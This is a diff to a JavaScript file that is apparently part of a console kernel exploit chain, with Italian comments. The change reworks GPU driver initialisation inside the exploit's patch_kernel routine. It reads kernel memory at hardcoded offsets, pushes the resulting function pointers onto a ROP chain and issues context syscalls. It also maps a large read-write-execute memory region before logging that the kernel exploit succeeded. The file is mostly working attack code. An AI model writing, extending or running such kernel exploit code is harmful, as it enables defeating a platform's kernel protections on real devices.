@@ -24,12 +24,14 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 // * RESTORE - code will repair kernel panic vulnerability
 // * MEMLEAK - memory leaks that our code will induce
 
-import { Int } from './module/int64.mjs';
+ 
 import { mem } from './module/mem.mjs';
 import { log, die, hex, hexdump } from './module/utils.mjs';
 import { cstr, jstr } from './module/memtools.mjs';
 import { page_size, context_size } from './module/offset.mjs';
 import { Chain } from './module/chain.mjs';
+import { Int, int64 } from './module/int64.mjs';
+
 
 import {
     View1, View2, View4,
@@ -62,42 +64,69 @@ const [is_ps4, version] = (() => {
     return [is_ps4, version];
 })();
 
-
+function toInt64(value) {
+    if (value instanceof Int) return value;
+    return new Int(value);
+}
 
 function init_gpu(kmem) {
-    try {
+  
        
-        const gnmHandle = chain.sysi('dynlib_load_prx', 
-            cstr("/common/lib/libSceGnmDriver.sprx"),
-            0, 0
+      try {
+        // 1. Carica il driver grafico con gestione corretta degli interi
+        const handle_buf = new View4(1);
+        const res = sysi('dynlib_load_prx', 
+            cstr("/common/lib/libSceGnmDriver.sprx").addr,
+            0,
+            handle_buf.addr
         );
         
-        // 2. Ottieni l'indirizzo di GnmDriver
-        const procParam = kmem.read64(kmem.read64(kbase.add(0x19BB000))[0]);
-        const gnmDriver = kmem.read64(procParam.add(0x160));
+        if (res !== 0) {
+            throw new Error(`dynlib_load_prx failed: ${res}`);
+        }
         
-        // 3. Inizializza il driver
-        const initFunc = gnmDriver.add(0x28);
-        chain.push_call(initFunc);
+        const gnmHandle = handle_buf[0];
+        log(`Graphics driver handle: ${gnmHandle}`);
+        
+       
+        const procParamPtr = kbase.add(0x19BB000);
+        const procParam = toInt64(kmem.read64(procParamPtr));
+        log(`Process parameter: ${procParam}`);
+        
+       
+        const gnmDriverPtr = toInt64(kmem.read64(procParam.add(0x160)));
+        log(`GnmDriver pointer: ${gnmDriverPtr}`);
+        
+      
+        const initFuncPtr = toInt64(kmem.read64(gnmDriverPtr.add(0x28)));
+        log(`Init function address: ${initFuncPtr}`);
+        
+      
+        chain.push_call(initFuncPtr);
         chain.run();
         
         log("GPU driver initialized");
     } catch (e) {
         log("GPU init error: " + e);
+      
+        try {
+            chain.syscall('sys_ctx', 1, 0);
+            chain.syscall('sys_ctx', 0, 0x10000000);
+        } catch (fallbackErr) {
+            log("GPU fallback failed: " + fallbackErr);
+        }
     }
 }
 
 
 function safe_gpu_reset() {
-    try {
-        // 1. Reset del contesto
-        chain.syscall('sys_ctx', 3, 0);  // SYS_CTX_GPU_RESET
+ try {
+       
+        const ctx_arg = new Int(0x10000000);
         
-        // 2. Re-inizializzazione
-        chain.syscall('sys_ctx', 1, 0);  // SYS_CTX_GPU_INIT
-        
-        // 3. Ripristino stato
-        chain.syscall('sys_ctx', 0, 0x10000000);  // SYS_CTX_GPU_SET
+        chain.syscall('sys_ctx', 3, 0);
+        chain.syscall('sys_ctx', 1, 0);
+        chain.syscall('sys_ctx', 0, ctx_arg.lo, ctx_arg.hi);
     } catch (e) {
         log("GPU reset error: " + e);
     }
@@ -1642,6 +1671,21 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     init_gpu(kmem);
 
     chain.syscall('sys_ctx', 1, 0);
+
+        try {
+         
+        const gpuMem = chain.sysp('mmap', 
+            new Int(0),                 // address
+            new Int(0x2000000),         // size
+            new Int(0x7),               // prot
+            new Int(0x1000 | 0x200000), // flags
+            new Int(-1),                // fd
+            new Int(0)                  // offset
+        );
+        log(`GPU memory allocated at: ${gpuMem}`);
+    } catch (e) {
+        log("GPU memory allocation failed: " + e);
+    }
 
     
     log('kernel exploit succeeded!');
